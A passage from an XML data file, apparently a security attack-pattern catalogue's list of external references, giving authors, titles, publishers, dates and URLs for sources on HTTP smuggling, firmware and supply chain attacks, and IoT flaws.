         <ns0:URL>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.html</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-678">
         <ns0:Author>Edi Kogan</ns0:Author>
         <ns0:Author>Daniel Kerman</ns0:Author>
         <ns0:Title>HTTP Desync Attacks in the Wild and How to Defend Against Them</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---29</ns0:Publication_Day>
         <ns0:Publisher>Imperva</ns0:Publisher>
         <ns0:URL>https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-679">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>HTTP Request Splitting</ns0:Title>
         <ns0:Publication_Year>2011</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246929/HTTP%20Request%20Splitting</ns0:URL>
         <ns0:URL_Date>2021-10-14</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-680">
         <ns0:Author>Robert Auger</ns0:Author>
         <ns0:Title>HTTP Response Splitting</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publisher>The Web Application Security Consortium</ns0:Publisher>
         <ns0:URL>http://projects.webappsec.org/w/page/13246931/HTTP%20Response%20Splitting</ns0:URL>
         <ns0:URL_Date>2021-10-14</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-681">
         <ns0:Author>James Kettle</ns0:Author>
         <ns0:Title>HTTP Desync Attacks: Request Smuggling Reborn</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---07</ns0:Publication_Day>
         <ns0:Publisher>PortSwigger</ns0:Publisher>
         <ns0:URL>https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-682">
         <ns0:Title>HTTP request smuggling</ns0:Title>
         <ns0:Publisher>PortSwigger</ns0:Publisher>
         <ns0:URL>https://portswigger.net/web-security/request-smuggling</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-683">
         <ns0:Title>Finding HTTP request smuggling vulnerabilities</ns0:Title>
         <ns0:Publisher>PortSwigger</ns0:Publisher>
         <ns0:URL>https://portswigger.net/web-security/request-smuggling/finding</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-684">
         <ns0:Title>Exploiting HTTP request smuggling vulnerabilities</ns0:Title>
         <ns0:Publisher>PortSwigger</ns0:Publisher>
         <ns0:URL>https://portswigger.net/web-security/request-smuggling/exploiting</ns0:URL>
         <ns0:URL_Date>2021-10-06</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-685">
         <ns0:Title>Kaspersky Finds Sophisticated UEFI Malware in the Wild</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---05</ns0:Publication_Day>
         <ns0:Publisher>ExtremeTech</ns0:Publisher>
         <ns0:URL>https://www.extremetech.com/computing/315860-kaspersky-finds-sophisticated-uefi-malware-in-the-wild</ns0:URL>
         <ns0:URL_Date>2021-10-19</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-686">
         <ns0:Title>Wikipedia</ns0:Title>
         <ns0:Publisher>The Wikimedia Foundation, Inc</ns0:Publisher>
         <ns0:URL>https://en.wikipedia.org/wiki/Billion_laughs_attack</ns0:URL>
         <ns0:URL_Date>2021-10-19</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-687">
         <ns0:Title>Cortex-R4 Manual</ns0:Title>
         <ns0:Publisher>ARM</ns0:Publisher>
         <ns0:URL>https://developer.arm.com/ip-products/processors/cortex-m/cortex-m4</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-688">
         <ns0:Title>MCS 51 Microcontroller Family User's Manual</ns0:Title>
         <ns0:Publisher>Intel Corporation</ns0:Publisher>
         <ns0:URL>https://web.mit.edu/6.115/www/document/8051.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-689">
         <ns0:Title>Memory Protection Unit (MPU)</ns0:Title>
         <ns0:Publisher>ARM</ns0:Publisher>
         <ns0:URL>https://static.docs.arm.com/100699/0100/armv8m_architecture_memory_protection_unit_100699_0100_00_en.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-690">
         <ns0:Author>Christopher Domas</ns0:Author>
         <ns0:Title>The Memory Sinkhole</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---20</ns0:Publication_Day>
         <ns0:URL>https://github.com/xoreaxeaxeax/sinkhole/blob/master/us-15-Domas-TheMemorySinkhole-wp.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-691">
         <ns0:Title>Address Range Memory Mirroring</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>Taku Izumi, Fujitsu Limited</ns0:Publisher>
         <ns0:URL>https://www.fujitsu.com/jp/documents/products/software/os/linux/catalog/LinuxConJapan2016-Izumi.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-692">
         <ns0:Author>Yuriy Bulygin</ns0:Author>
         <ns0:Author>Oleksandr Bazhaniuk</ns0:Author>
         <ns0:Author>Andrew Furtak</ns0:Author>
         <ns0:Author>John Loucaides</ns0:Author>
         <ns0:Author>Mikhail Gorobets</ns0:Author>
         <ns0:Title>BARing the System &#8211; New vulnerabilities in Coreboot &amp; UEFI-based Systems</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:URL>https://www.c7zero.info/stuff/REConBrussels2017_BARing_the_system.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-693">
         <ns0:Author>Brandon Hill</ns0:Author>
         <ns0:Title>Huge Intel CPU Bug Allegedly Causes Kernel Memory Vulnerability With Up To 30% Performance Hit In Windows And Linux</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---02</ns0:Publication_Day>
         <ns0:Publisher>David Altavilla and Hot Hardware, Inc</ns0:Publisher>
         <ns0:URL>https://hothardware.com/news/intel-cpu-bug-kernel-memory-isolation-linux-windows-macos</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-694">
         <ns0:Title>PCIe Device Measurement Requirements</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--09</ns0:Publication_Month>
         <ns0:Publisher>Intel Corporation</ns0:Publisher>
         <ns0:URL>https://www.intel.com/content/dam/www/public/us/en/documents/reference-guides/pcie-device-security-enhancements.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-695">
         <ns0:Author>John Butterworth</ns0:Author>
         <ns0:Author>Cory Kallenberg</ns0:Author>
         <ns0:Author>Xeno Kovah</ns0:Author>
         <ns0:Title>BIOS Chronomancy: Fixing the Core Root of Trust for Measurement</ns0:Title>
         <ns0:Publication_Year>2013</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---31</ns0:Publication_Day>
         <ns0:URL>https://media.blackhat.com/us-13/US-13-Butterworth-BIOS-Security-Slides.pdf</ns0:URL>
         <ns0:URL_Date>2021-10-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-696">
         <ns0:Author>Ben Martens</ns0:Author>
         <ns0:Title>11 Facts + Stats on Smishing (SMS Phishing) in 2021</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publisher>SafetyDetectives</ns0:Publisher>
         <ns0:URL>https://www.safetydetectives.com/blog/what-is-smishing-sms-phishing-facts/</ns0:URL>
         <ns0:URL_Date>2021-11-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-697">
         <ns0:Author>Microsoft Defender Security Research Team</ns0:Author>
         <ns0:Title>New ransomware, old techniques: Petya adds worm capabilities</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publisher>Microsoft</ns0:Publisher>
         <ns0:URL>https://www.microsoft.com/security/blog/2017/06/27/new-ransomware-old-techniques-petya-adds-worm-capabilities/</ns0:URL>
         <ns0:URL_Date>2022-02-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-698">
         <ns0:Author>Paul Wagner</ns0:Author>
         <ns0:Title>Combating Counterfeit Components in the DoD Supply Chain</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publisher>Defence Systems Information Analysis Center</ns0:Publisher>
         <ns0:URL>https://dsiac.org/articles/combating-counterfeit-components-in-the-dod-supply-chain/</ns0:URL>
         <ns0:URL_Date>2022-02-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-699">
         <ns0:Author>Nicolas Falliere</ns0:Author>
         <ns0:Author>Liam O Murchu</ns0:Author>
         <ns0:Author>Eric Chien</ns0:Author>
         <ns0:Title>W32.Stuxnet Dossier</ns0:Title>
         <ns0:Publication_Year>2010</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publisher>Symantec</ns0:Publisher>
         <ns0:URL>https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf</ns0:URL>
         <ns0:URL_Date>2022-02-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-700">
         <ns0:Author>Cristin Goodwin</ns0:Author>
         <ns0:Author>Joram Borenstein</ns0:Author>
         <ns0:Title>Guarding against supply chain attacks&#8212;Part 3: How software becomes compromised</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>Microsoft</ns0:Publisher>
         <ns0:URL>https://www.microsoft.com/security/blog/2020/03/11/guarding-against-supply-chain-attacks-part-3-how-software-becomes-compromised/</ns0:URL>
         <ns0:URL_Date>2022-02-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-701">
         <ns0:Author>Oliver Tennert</ns0:Author>
         <ns0:Title>Using the ATA security features of modern hard disks and SSDs</ns0:Title>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>Admin Magazine</ns0:Publisher>
         <ns0:URL>https://www.admin-magazine.com/Archive/2014/19/Using-the-ATA-security-features-of-modern-hard-disks-and-SSDs</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-702">
         <ns0:Title>Breaking ATA Password Security</ns0:Title>
         <ns0:Publisher>The University of Texas at Austin Information Security Office</ns0:Publisher>
         <ns0:URL>https://security.utexas.edu/education-outreach/BreakingATA</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-703">
         <ns0:Author>Ujjwal Guin</ns0:Author>
         <ns0:Author>Ke Huang</ns0:Author>
         <ns0:Author>Daniel DiMase</ns0:Author>
         <ns0:Author>John M. Carulli, Jr.</ns0:Author>
         <ns0:Author>Mohammad Tehranipoor</ns0:Author>
         <ns0:Author>Yiorgos Makris</ns0:Author>
         <ns0:Title>Counterfeit Integrated Circuits: A Rising Threat in the Global Semiconductor Supply Chain</ns0:Title>
         <ns0:Publication>Proceedings of the IEEE</ns0:Publication>
         <ns0:Publication_Year>2014</ns0:Publication_Year>
         <ns0:Publisher>IEEE</ns0:Publisher>
         <ns0:URL>https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=6856206</ns0:URL>
         <ns0:URL_Date>2022-02-15</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-704">
         <ns0:Author>Ax Sharma</ns0:Author>
         <ns0:Title>Dev corrupts NPM libs 'colors' and 'faker' breaking thousands of apps</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---09</ns0:Publication_Day>
         <ns0:Publisher>BleepingComputer</ns0:Publisher>
         <ns0:URL>https://www.bleepingcomputer.com/news/security/dev-corrupts-npm-libs-colors-and-faker-breaking-thousands-of-apps/</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-705">
         <ns0:Author>Alberto Pellitteri</ns0:Author>
         <ns0:Title>Malicious modifications to open source projects affecting thousands</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---12</ns0:Publication_Day>
         <ns0:Publisher>SysDig</ns0:Publisher>
         <ns0:URL>https://sysdig.com/blog/malicious-modifications-detection-sysdig/</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-706">
         <ns0:Title>Chef Manage deserializes cookie data insecurely</ns0:Title>
         <ns0:Publication_Year>2016</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>Carnegie Mellon University</ns0:Publisher>
         <ns0:URL>https://www.kb.cert.org/vuls/id/586503</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-707">
         <ns0:Author>Thomas Brewster</ns0:Author>
         <ns0:Title>How Lenovo's Superfish 'Malware' Works And What You Can Do To Kill It</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---19</ns0:Publication_Day>
         <ns0:Publisher>Forbes</ns0:Publisher>
         <ns0:URL>https://www.forbes.com/sites/thomasbrewster/2015/02/19/superfish-need-to-know/?sh=991ab8c38776</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-708">
         <ns0:Author>Dan Goodin</ns0:Author>
         <ns0:Title>Lenovo PCs ship with man-in-the-middle adware that breaks HTTPS connections</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---19</ns0:Publication_Day>
         <ns0:Publisher>Ars Technica</ns0:Publisher>
         <ns0:URL>https://arstechnica.com/information-technology/2015/02/lenovo-pcs-ship-with-man-in-the-middle-adware-that-breaks-https-connections/</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-709">
         <ns0:Author>Rob Graham</ns0:Author>
         <ns0:Title>Extracting the SuperFish certificate</ns0:Title>
         <ns0:Publication_Year>2015</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---19</ns0:Publication_Day>
         <ns0:Publisher>Errata Security</ns0:Publisher>
         <ns0:URL>https://blog.erratasec.com/2015/02/extracting-superfish-certificate.html#.VOX5Ky57RqE</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-710">
         <ns0:Author>Sean Endicott</ns0:Author>
         <ns0:Title>Fake Microsoft update used in malicious email attack campaign</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publisher>Microsoft News</ns0:Publisher>
         <ns0:URL>https://www.msn.com/en-us/news/technology/fake-microsoft-update-used-in-malicious-email-attack-campaign/ar-AALTcVs</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-711">
         <ns0:Author>Omer Shwartz</ns0:Author>
         <ns0:Author>Amir Cohen</ns0:Author>
         <ns0:Author>Asaf Shabtai</ns0:Author>
         <ns0:Author>Yossi Oren</ns0:Author>
         <ns0:Title>Shattered Trust: When Replacement Smartphone Components Attack</ns0:Title>
         <ns0:Publication>11th USENIX Workshop on Offensive Technologies</ns0:Publication>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publisher>USENIX</ns0:Publisher>
         <ns0:URL>https://www.usenix.org/system/files/conference/woot17/woot17-paper-shwartz.pdf</ns0:URL>
         <ns0:URL_Date>2022-02-16</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-712">
         <ns0:Author>Cristin Goodwin</ns0:Author>
         <ns0:Author>Joram Borenstein</ns0:Author>
         <ns0:Title>Guarding against supply chain attacks&#8212;Part 2: Hardware risks</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--02</ns0:Publication_Month>
         <ns0:Publication_Day>---03</ns0:Publication_Day>
         <ns0:Publisher>Microsoft</ns0:Publisher>
         <ns0:URL>https://www.microsoft.com/security/blog/2020/02/03/guarding-against-supply-chain-attacks-part-2-hardware-risks/</ns0:URL>
         <ns0:URL_Date>2022-02-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-713">
         <ns0:Author>Jordan Robertson</ns0:Author>
         <ns0:Author>Michael Riley</ns0:Author>
         <ns0:Title>The Big Hack: How China Used a Tiny Chip to Infiltrate U.S. Companies</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---04</ns0:Publication_Day>
         <ns0:Publisher>Bloomberg</ns0:Publisher>
         <ns0:URL>https://www.bloomberg.com/news/features/2018-10-04/the-big-hack-how-china-used-a-tiny-chip-to-infiltrate-america-s-top-companies</ns0:URL>
         <ns0:URL_Date>2022-02-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-714">
         <ns0:Title>Operation Wilted Tulip: Exposing a cyber espionage apparatus</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publisher>ClearSky cyber security and Trend Micro</ns0:Publisher>
         <ns0:URL>https://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf</ns0:URL>
         <ns0:URL_Date>2022-02-17</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-715">
         <ns0:Author>Marie Prokopets</ns0:Author>
         <ns0:Title>How To Secure Your Documents</ns0:Title>
         <ns0:Publisher>Nira</ns0:Publisher>
         <ns0:URL>https://nira.com/how-to-secure-your-documents/</ns0:URL>
         <ns0:URL_Date>2022-02-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-716">
         <ns0:Author>Daniel Simpson</ns0:Author>
         <ns0:Author>Dani Halfin</ns0:Author>
         <ns0:Author>Andrews Mariano Gorzelany</ns0:Author>
         <ns0:Author>Beth Woodbury</ns0:Author>
         <ns0:Title>Supply chain attacks</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---28</ns0:Publication_Day>
         <ns0:Publisher>Microsoft</ns0:Publisher>
         <ns0:URL>https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/supply-chain-malware</ns0:URL>
         <ns0:URL_Date>2022-02-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-717">
         <ns0:Author>Linda Pesante</ns0:Author>
         <ns0:Author>Christopher King</ns0:Author>
         <ns0:Author>George Silowash</ns0:Author>
         <ns0:Title>Disposing of Devices Safely</ns0:Title>
         <ns0:Publication_Year>2012</ns0:Publication_Year>
         <ns0:Publisher>CISA United States Computer Emergency Readiness Team (US-CERT)</ns0:Publisher>
         <ns0:URL>https://www.cisa.gov/uscert/sites/default/files/publications/DisposeDevicesSafely.pdf</ns0:URL>
         <ns0:URL_Date>2022-02-21</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-718">
         <ns0:Title>Supply Chain Risks for Information and Communication Technology</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publisher>Cyber and Infrastructure Security Agency (CISA)</ns0:Publisher>
         <ns0:URL>https://www.cisa.gov/sites/default/files/publications/19_0424_cisa_nrmc_supply-chain-risks-for-information-and-communication-technology.pdf</ns0:URL>
         <ns0:URL_Date>2022-07-26</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-719">
         <ns0:Author>Aviad Gershon</ns0:Author>
         <ns0:Title>Unverified Commits: Are You Unknowingly Trusting Attackers&#8217; Code?</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---15</ns0:Publication_Day>
         <ns0:Publisher>Checkmarx</ns0:Publisher>
         <ns0:URL>https://checkmarx.com/blog/unverified-commits-are-you-unknowingly-trusting-attackers-code/</ns0:URL>
         <ns0:URL_Date>2022-08-12</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-720">
         <ns0:Author>Deeba Ahmed</ns0:Author>
         <ns0:Title>Hackers can spoof commit metadata to create false GitHub repositories</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--07</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:Publisher>HackRead</ns0:Publisher>
         <ns0:URL>https://www.hackread.com/hackers-spoof-commit-metadata-false-github-repositories/</ns0:URL>
         <ns0:URL_Date>2022-08-12</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-721">
         <ns0:Author>Tzachi Zornstein</ns0:Author>
         <ns0:Title>StarJacking &#8211; Making Your New Open Source Package Popular in a Snap</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---19</ns0:Publication_Day>
         <ns0:Publisher>Checkmarx</ns0:Publisher>
         <ns0:URL>https://checkmarx.com/blog/starjacking-making-your-new-open-source-package-popular-in-a-snap/</ns0:URL>
         <ns0:URL_Date>2022-08-12</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-722">
         <ns0:Author>Indiana Moreau</ns0:Author>
         <ns0:Title>Repo Jacking: Exploiting the Dependency Supply Chain</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--10</ns0:Publication_Month>
         <ns0:Publication_Day>---22</ns0:Publication_Day>
         <ns0:Publisher>Security Innovation</ns0:Publisher>
         <ns0:URL>https://www.concretecms.org/about/project-news/security/supply-chain-hack-phpass-repo-jacking</ns0:URL>
         <ns0:URL_Date>2022-09-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-723">
         <ns0:Author>Alex Scroxton</ns0:Author>
         <ns0:Title>Alarm bells ring, the IoT is listening</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---13</ns0:Publication_Day>
         <ns0:Publisher>TechTarget</ns0:Publisher>
         <ns0:URL>https://www.computerweekly.com/news/252475324/Alarm-bells-ring-the-IoT-is-listening</ns0:URL>
         <ns0:URL_Date>2022-09-08</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-724">
         <ns0:Author>Matthew Hughes</ns0:Author>
         <ns0:Title>Bad news: KeyWe Smart Lock is easily bypassed and can't be fixed</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---11</ns0:Publication_Day>
         <ns0:Publisher>Situation Publishing</ns0:Publisher>
         <ns0:URL>https://www.theregister.com/2019/12/11/f_secure_keywe/</ns0:URL>
         <ns0:URL_Date>2022-09-08</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-725">
         <ns0:Author>Brian Krebs</ns0:Author>
         <ns0:Title>Zyxel Flaw Powers New Mirai IoT Botnet Strain</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--03</ns0:Publication_Month>
         <ns0:Publication_Day>---20</ns0:Publication_Day>
         <ns0:Publisher>Krebs on Security</ns0:Publisher>
         <ns0:URL>https://krebsonsecurity.com/2020/03/zxyel-flaw-powers-new-mirai-iot-botnet-strain/</ns0:URL>
         <ns0:URL_Date>2022-09-08</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-726">
         <ns0:Author>Colin Schulz</ns0:Author>
         <ns0:Author>Stefan Raff</ns0:Author>
         <ns0:Author>Sebastian Kortmann</ns0:Author>
         <ns0:Author>Nikolaus Obwegeser</ns0:Author>
         <ns0:Title>Digital Age Organizations: Uncovering Over-the-Air Updates in the Smart Product Realm</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publisher>International Conference on Information Systems (ICIS) 2021</ns0:Publisher>
         <ns0:URL>https://www.researchgate.net/publication/356065917_Digital_Age_Organizations_Uncovering_Over-the-Air_Updates_in_the_Smart_Product_Realm</ns0:URL>
         <ns0:URL_Date>2022-09-08</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-727">
         <ns0:Title>Language-Specific Registry Entries</ns0:Title>
         <ns0:URL>https://learn.microsoft.com/en-us/previous-versions/windows/desktop/indexsrv/language-specific-registry-entries</ns0:URL>
         <ns0:URL_Date>2018-05-31</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-728">
         <ns0:Title>winnls.h header</ns0:Title>
         <ns0:URL>https://learn.microsoft.com/en-us/windows/win32/api/winnls/</ns0:URL>
         <ns0:URL_Date>2022-08-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-729">
         <ns0:Title>local (1p) - Linux Man Pages</ns0:Title>
         <ns0:URL>https://www.systutorials.com/docs/linux/man/1p-locale/</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-730">
         <ns0:Title>vconsole.conf</ns0:Title>
         <ns0:URL>https://www.freedesktop.org/software/systemd/man/vconsole.conf.html</ns0:URL>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-731">
         <ns0:Title>timedatectl</ns0:Title>
         <ns0:URL>https://www.freedesktop.org/software/systemd/man/timedatectl.html</ns0:URL>
         <ns0:URL_Date>2022-08-12</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-732">
         <ns0:Author>Theo Burton</ns0:Author>
         <ns0:Title>CyRC Vulnerability Analysis: Repo jacking in the software supply chain</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---02</ns0:Publication_Day>
         <ns0:Publisher>Synopsys</ns0:Publisher>
         <ns0:URL>https://www.synopsys.com/blogs/software-security/cyrc-vulnerability-analysis-repo-jacking/</ns0:URL>
         <ns0:URL_Date>2022-09-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-733">
         <ns0:Author>Jossef Harush</ns0:Author>
